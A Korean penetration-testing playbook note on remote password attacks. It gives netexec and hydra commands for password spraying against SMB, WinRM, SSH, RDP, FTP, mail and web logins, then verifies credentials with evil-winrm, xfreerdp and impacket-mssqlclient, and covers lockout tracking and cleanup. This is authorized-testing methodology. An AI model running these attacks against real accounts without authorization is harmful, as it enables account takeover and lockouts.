# 원격 비밀번호 공격

## 한 줄 판단

실행 호스트에서 대상 인증 서비스 포트에 연결할 수 있고 공격 대상 사용자명과 평문 비밀번호 후보가 있으면 잠금 정책 안에서 최소 횟수로 검증하고, 자동 도구의 성공 표시를 정상 클라이언트 로그인·로그인된 계정·실제 서비스 권한으로 다시 입증한다.

## 사용할 때

- 현재 보유 정보: SMTP·SMB·RPC·웹·문서 등에서 얻은 공격 대상 사용자명과 공통 초기 비밀번호·계절/회사명 기반 비밀번호·유출 credential 후보를 확보했다.
- 명령 실행 위치와 도달성: 검증 도구를 실행할 호스트에서 SSH·SMB·WinRM·RDP·DB·FTP·메일·웹 중 식별한 인증 서비스에 접근할 수 있다.
- 현재 가능한 행동과 결과: 잠금·rate limit 범위 안에서 사용자명·평문 비밀번호 조합을 검증하고, 성공한 대상 계정이 사용할 수 있는 서비스 기능·세션·관리자 권한을 각각 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 실행 호스트에서 식별한 인증 서비스의 호스트·포트 접근 가능 | 서비스별 정상 클라이언트 연결과 배너·TLS 확인 | DNS·라우팅·방화벽·TLS와 서비스 포트를 먼저 확인 |
| 현재 계정 또는 인증 수단 | 공격 대상의 실제 사용자명 형식과 평문 비밀번호 후보 확보 | SMTP·SMB·RPC·웹·OSINT 결과와 `<TARGET>\<USER>`·`<DOMAIN>\<USER>`·UPN 구분 | 사용자 존재와 형식을 다시 확인하고 여러 계정 범위를 섞지 않음 |
| 현재 권한 | 인증 전 검증에는 관리자 권한이 필요하지 않으며 성공 후 권한은 공격 대상 계정과 서비스에 따름 | 현재 실행자와 양성 대상 사용자, 서비스별 기능을 별도 기록 | 인증 성공을 실행 호스트 권한이나 대상 관리자 권한으로 해석하지 않음 |
| 공격 대상의 조건 | 서비스별 인증 프로토콜·실패 신호와 잠금·rate limit 정책이 확인됨 | 서비스 노트, 정책 조회, 수동 단일 조합 응답 확인 | 정책 또는 실패 marker가 불명확하면 자동 시도를 시작하지 않음 |
| 필요한 파일·목록·주소 | 사용자 목록, 적은 수의 비밀번호 후보, 최대 시도·간격과 정상 클라이언트 재검증 경로 확정 | 입력 건수·중복·계정 형식과 성공 기준 검토 | 범위를 축소하고 Password Spraying이면 [[내부 AD Password Spraying]]으로 분리 |

## 실행

1. 로컬 계정, 도메인 계정, UPN, 이메일 주소 중 서비스가 기대하는 사용자명 형식을 정한다.
2. AD 대상이면 [[AD 비밀번호 정책 열거 및 조회]]와 [[인증 전 AD 사용자 목록 수집]]으로 입력을 먼저 좁힌다.
3. 잠금 정책을 확인하고 하나의 비밀번호를 여러 계정에 낮은 빈도로 적용하는 Password Spraying을 우선한다. 내부 AD 범위의 실행과 대기 간격 판단은 [[내부 AD Password Spraying]]으로 넘긴다.
4. 자동 도구에서 양성 결과가 나오면 해당 조합만 정상 클라이언트로 다시 로그인한다.
5. 인증 성공, 서비스 기능 접근, 대화형 세션, 관리자 권한을 각각 분리해 기록한다.

### 낮은 빈도의 서비스별 탐색

```bash
netexec smb <TARGET> -u users.txt -p '<PASSWORD>' --continue-on-success
netexec winrm <TARGET> -u users.txt -p '<PASSWORD>' --continue-on-success
hydra -L users.txt -p '<PASSWORD>' -t 2 -f ssh://<TARGET>
hydra -L users.txt -p '<PASSWORD>' -t 1 -f ftp://<TARGET>
hydra -L users.txt -p '<PASSWORD>' -t 1 -f rdp://<TARGET>
hydra -L users.txt -p '<PASSWORD>' -t 1 -f pop3://<TARGET>
hydra -L users.txt -p '<PASSWORD>' -t 1 -f imap://<TARGET>
hydra -L users.txt -p '<PASSWORD>' -t 1 -f smtp://<TARGET>
```

확인할 출력:

- NetExec의 `[+] <DOMAIN>\<USER>:<PASSWORD>`와 Hydra의 `login`, `password`.
- `Pwn3d!`는 SMB 인증 성공과 별개인 관리자급 작업 가능성 신호다.
- FTP의 `550`·`421`, RDP 연결 오류, TLS 또는 Hydra module 오류는 인증 실패로 단정하지 않고 단일 조합으로 재검증한다.

### 웹 인증 지점

HTTP Basic 인증:

```bash
hydra -L users.txt -p '<PASSWORD>' <TARGET> http-get /<PROTECTED_PATH>
curl -i -u '<USER>:<PASSWORD>' http://<TARGET>/<PROTECTED_PATH>
```

로그인 폼:

```bash
hydra -L users.txt -p '<PASSWORD>' <TARGET> http-post-form '/login:username=^USER^&password=^PASS^:F=<FAILURE_MARKER>'
test ! -e '<COOKIE_JAR>'
curl -i -c '<COOKIE_JAR>' -d 'username=<USER>&password=<PASSWORD>' http://<TARGET>/login
```

확인할 출력:

- Basic 인증은 `401`이 사라지고 보호된 리소스가 반환되는지 확인한다.
- 폼 인증은 실패 문자열, redirect, session cookie와 인증 후 전용 URL 접근을 함께 확인한다.
- 로그인 성공 후에도 다른 사용자의 객체나 관리자 기능 접근은 별도 인가 검증 대상이다.

### 양성 credential의 실제 서비스 로그인

SMB와 WinRM:

```bash
netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --shares
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
```

RDP:

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution
```

SSH와 FTP:

```bash
sshpass -p '<PASSWORD>' ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USER>@<TARGET> 'id; hostname'
ftp <TARGET>
```

FTP 대화형 프롬프트에서 `<USER>`와 `<PASSWORD>`를 입력하고 `230`과 디렉터리 조회 결과를 확인한다.

MSSQL Windows 인증과 SQL 인증:

```bash
impacket-mssqlclient '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -windows-auth
impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>'
```

접속 후 다음 query로 인증 주체와 서버를 확인한다.

```sql
SELECT SYSTEM_USER;
SELECT @@SERVERNAME;
```

MySQL:

```bash
mysql -h <TARGET> -u <USER> -p'<PASSWORD>' -e 'SELECT CURRENT_USER(), @@hostname;'
```

메일 서비스의 단일 조합 재검증:

```bash
hydra -l <USER> -p '<PASSWORD>' -t 1 -V pop3://<TARGET>
hydra -l <USER> -p '<PASSWORD>' -t 1 -V imap://<TARGET>
hydra -l <USER> -p '<PASSWORD>' -t 1 -V smtp://<TARGET>
```

확인할 출력:

- SMB share 목록, WinRM/SSH/RDP 세션, FTP `230`, DB의 현재 login, 메일 프로토콜의 성공 응답을 서비스별 proof로 사용한다.
- 한 서비스의 성공을 다른 서비스의 인증 성공이나 관리자 권한으로 확대 해석하지 않는다.

| 잠금·rate limit 신호 | 추가 시도가 계정 상태를 바꿀 수 있음 | 검증 중단 | 시도를 즉시 멈추고 정책과 계정 상태 확인 |
| FTP `550`·`421` 또는 비정상 응답 반복 | 병렬 세션 제한이나 상태 처리 문제일 수 있음 | 인증 결과 불확실 | Hydra `-t 1`과 수동 FTP의 `230`·`530` 응답 비교 |

## 확인할 출력과 권한

- 자동 도구의 양성 결과와 정상 클라이언트의 실제 로그인 proof를 함께 남긴다.
- 로컬 계정은 `<TARGET>\<USER>`, 도메인 계정은 `<DOMAIN>\<USER>` 또는 UPN 형식으로 구분한다.
- 인증 성공, READ·WRITE, 대화형 세션, 원격 명령 실행, 로컬 관리자와 도메인 권한을 각각 구분한다.
- 명령을 실행한 현재 사용자와 성공한 공격 대상 계정은 다른 주체이며, 평문 비밀번호 성공을 hash·ticket 인증 성공으로 바꾸어 기록하지 않는다.

## 변경 영향과 복구

인증 시도를 시작하기 전에 대상별 시도 횟수와 시간, AD 계정이면 권한 있는 관리자가 확인한 `LockedOut`·`BadLogonCount`·`LastBadPasswordAttempt` 기준값을 작업 기록에 남긴다. 실제 비밀번호와 전체 인증 응답은 Vault에 기록하지 않는다.

| 변경·생성 항목 | 기존 상태와 식별값 | 종료·복구 | 완료 확인 |
|---|---|---|---|
| 웹 session cookie 파일 | `test ! -e '<COOKIE_JAR>'`로 기존 파일이 없음을 확인하고 이번 실행의 절대 경로 기록 | 인증·인가 확인을 마친 Linux 공격 호스트에서 `rm -- '<COOKIE_JAR>'` | `test ! -e '<COOKIE_JAR>'`가 성공 |
| WinRM·FTP·DB 대화형 client | 접속한 대상·계정과 client PID 또는 terminal 기록 | 각 prompt에서 `exit` 또는 `quit`로 정상 종료. RDP는 대상 세션 안에서 로그오프하고 창만 닫아 disconnected session을 남기지 않음 | 로컬 client가 종료되고 대상의 해당 세션이 더 이상 활성 상태가 아님 |
| AD 계정 잠금 | 같은 `<DC_FQDN>`에서 확인한 시도 전후 `LockedOut`·`BadLogonCount`·`LastBadPasswordAttempt`, 시도 발생 호스트와 시간 | 먼저 모든 인증 시도를 중단한다. 잠겼다면 승인된 AD 관리자만 `Unlock-ADAccount -Identity '<USER>' -Server '<DC_FQDN>' -Confirm`으로 해제 | `Get-ADUser -Identity '<USER>' -Server '<DC_FQDN>' -Properties LockedOut,BadLogonCount,LastBadPasswordAttempt`에서 `LockedOut: False`와 새 시도가 멈춘 상태 확인 |

비 AD 서비스의 잠금 해제 방법은 제품마다 다르므로 해당 서비스 관리자가 계정 상태와 잠금 정책을 확인한 뒤 공식 절차로 복구한다. 잠금 해제는 인증 실패 횟수와 보안 감사 기록을 되돌리지 않으며, 생성된 원격 로그온·감사 흔적도 삭제하지 않는다. 따라서 세션과 로컬 파일을 정리하고 계정 접근을 복구했더라도 전체 원상복구로 기록하지 않는다.

복구가 실패하면 먼저 자동 시도 프로세스가 남아 있는지와 다른 실행 호스트에서 같은 계정을 계속 시도하는지 확인한다. `BadLogonCount`는 DC별 값일 수 있으므로 기준선과 완료 확인은 같은 `<DC_FQDN>`을 사용한다. AD cmdlet은 ActiveDirectory module과 잠금 해제 권한이 있는 관리 셸에서만 실행한다.
